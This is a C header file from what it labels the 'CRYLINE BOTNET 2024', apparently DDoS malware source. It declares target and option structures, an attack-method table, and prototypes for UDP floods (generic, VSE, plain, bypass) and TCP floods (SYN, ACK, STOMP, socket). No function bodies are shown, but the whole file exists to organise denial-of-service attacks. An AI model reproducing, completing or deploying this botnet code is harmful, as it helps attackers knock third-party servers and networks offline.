/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

#pragma once

#include <time.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <arpa/inet.h>

#include "LIBRARIES.h"
#include "DO53_PROTOCOL_STRUCTURE.h"

struct __TARGET 
{
    struct sockaddr_in _SOCK_ADDRESS;
    __IPV4 _ADDRESS;
    uint8_t _NETMASK;
};

struct __OPTION 
{
    char *_VALUE;
    uint8_t _KEY;
};

typedef void (*ATTACK_FUNC) (uint8_t, struct __TARGET *, uint8_t, struct __OPTION *);

typedef uint8_t _ATTACK_VECTOR;

struct __METHOD 
{
    ATTACK_FUNC _FUNCTION;
    _ATTACK_VECTOR _VECTOR;
};

struct __DATA 
{
    __IPV4 _ADDRESS;
    uint32_t _GET_SEQ, _GET_ACK;
    __PORT_OPTION _GET_SOURCE_PORT, _GET_RPORT;
};

__GET_BOOL __INIT(void);

void __PARSE(char *, int);
void __START(int, _ATTACK_VECTOR, uint8_t, struct __TARGET *, uint8_t, struct __OPTION *);

char *__GET_OPT_STRING(uint8_t, struct __OPTION *, uint8_t, char *);

int __GET_OPT_INT(uint8_t, struct __OPTION *, uint8_t, int);

uint32_t __GET_OPT_IP(uint8_t, struct __OPTION *, uint8_t, uint32_t);

void __UDP_GENERIC_ATTACK(uint8_t, struct __TARGET *, uint8_t, struct __OPTION *);
void __UDP_VSE_ATTACK(uint8_t, struct __TARGET *, uint8_t, struct __OPTION *);
void __UDP_PLAIN_ATTACK(uint8_t, struct __TARGET *, uint8_t, struct __OPTION *);
void __UDP_BYPASS_ATTACK(uint8_t, struct __TARGET *, uint8_t, struct __OPTION *);

void __TCP_SYN_ATTACK(uint8_t, struct __TARGET *, uint8_t, struct __OPTION *);
void __TCP_ACK_ATTACK(uint8_t, struct __TARGET *, uint8_t, struct __OPTION *);
void __TCP_STOMP_ATTACK(uint8_t, struct __TARGET *, uint8_t, struct __OPTION *);
void __TCP_SOCKET_ATTACK(uint8_t, struct __TARGET *, uint8_t, struct __OPTION *);

static void __ADD(_ATTACK_VECTOR, ATTACK_FUNC);
static void __FREE_OPTS(struct __OPTION *, int);
